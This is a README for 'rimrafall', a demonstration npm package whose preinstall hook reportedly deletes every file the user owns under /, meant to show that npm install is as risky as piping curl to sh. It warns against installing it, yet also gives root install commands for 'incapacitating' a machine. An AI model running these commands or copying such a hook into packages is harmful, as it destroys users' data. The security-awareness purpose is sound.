# rimrafall

This is to show that `npm install` can be as dangerous as `curl dangerous.com | sh`.

# Whatever you do, do not

```
npm install rimrafall
```

It has a [`preinstall` script](https://github.com/joaojeronimo/rimrafall/blob/master/package.json#L7) that will delete all the files and folders your current user owns, recursively, in `/`.

## legitimate use case:

e.g., you need to completely incapacitate a machine (but please do heed the warning above):

```
sudo su -
npm install rimrafall
```

you might see lots of error messages like these:

```
rm: cannot remove `/sys/block/sda': Operation not permitted
rm: cannot remove `/sys/block/dm-0': Operation not permitted
rm: cannot remove `/sys/block/dm-1': Operation not permitted
```

which can safely be ignored.
